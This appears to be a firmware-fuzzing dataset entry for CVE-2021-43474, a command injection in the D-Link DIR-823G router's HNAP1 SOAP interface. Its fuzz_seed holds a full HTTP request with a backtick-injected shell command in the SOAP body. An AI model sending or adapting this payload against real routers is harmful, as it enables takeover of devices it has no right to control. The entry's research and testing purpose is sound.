vulnerability_id: CVE-2021-43474
affected_vendor: D-Link
firmware_version: DIR-823G
firmware_architecture: MIPS32
file_system: Squashfs
vulnerability_type: Command Injection
vulnerability_score: 9.8
vulnerability_severity: Critical
CWE_type: CWE-77
communication_protocol: SOAP„ÄÅHNAP
simulation_method: fat
vulnerability_description: An Access Control vulnerability exists in D-Link DIR-823G REVA1 1.02B05 (Lastest) via any parameter in the HNAP1 function
firmware_link: https://driver.zol.com.cn/down/465431_86_9_localdown.shtml
fuzz_seed: |
  POST /HNAP1/ HTTP/1.1
  Host: 192.168.0.1
  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5 
  Accept-Encoding: gzip, deflate
  Content-Type: text/xml; charset=utf-8
  SOAPAction: "http://purenetworks.com/HNAP1/GetGuestNetworkSettings"
  HNAP_AUTH: 183F4531CC823E205DD531F222E1F4A7 1599641600
  X-Requested-With: XMLHttpRequest
  Content-Length: 358
  Origin: http://192.168.0.1
  Connection: close
  Referer: http://192.168.0.1/DhcpServer.html

  <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetGuestNetworkSettings>'`>/web_mtn/123.txt`'<GetGuessNetworkSettings xmlnx="http://purenetworks.com/HNAP1/" /></soap:Body></soap:Envelope>